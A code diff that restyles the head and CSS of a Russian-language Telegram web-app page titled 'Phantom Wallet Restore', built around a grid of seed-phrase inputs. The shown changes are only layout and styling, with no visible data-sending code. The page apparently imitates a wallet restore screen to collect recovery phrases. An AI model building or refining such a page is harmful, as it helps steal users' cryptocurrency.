@@ -1,37 +1,33 @@
-<!DOCTYPE html>
-<html lang="ru">
-
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Phantom Wallet Restore</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="bip39Words.js"></script>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      margin: 30px;
+      margin: 0;
+      padding: 20px;
       background: #f2f2f2;
-      color: #333;
       text-align: center;
     }
 
     h2 {
       margin-bottom: 20px;
-    }
-
-    #word-count-toggle {
-      margin-bottom: 20px;
+      font-size: 22px;
     }
 
     .seed-grid {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
       gap: 10px;
       max-width: 600px;
       margin: 0 auto;
     }
 
     .seed-grid input {
-      padding: 8px;
+      padding: 10px;
       font-size: 14px;
       border: 2px solid #ccc;
       border-radius: 6px;
@@ -40,14 +36,14 @@
       transition: border-color 0.2s, background 0.2s;
     }
 
-    .seed-grid input.invalid {
-      border-color: red;
-      background: #ffe5e5;
+    .seed-grid input.valid {
+      border-color: #4caf50;
+      background-color: #e8f5e9;
     }
 
-    .seed-grid input.valid {
-      border-color: rgb(71, 223, 124);
-      background: #ffe5e5;
+    .seed-grid input.invalid {
+      border-color: red;
+      background-color: #ffe5e5;
     }
 
     button {
@@ -64,8 +60,36 @@
     button:hover {
       background-color: #5b21b6;
     }
+
+    #word-count-toggle {
+      margin-bottom: 20px;
+      font-size: 15px;
+    }
+
+    @media (max-width: 480px) {
+      h2 {
+        font-size: 20px;
+      }
+
+      .seed-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 8px;
+      }
+
+      .seed-grid input {
+        font-size: 13px;
+        padding: 8px;
+      }
+
+      button {
+        width: 100%;
+        font-size: 16px;
+        padding: 12px;
+      }
+    }
   </style>
 </head>
+
 
 <body>
   <h2>🔐 Восстановление кошелька</h2>
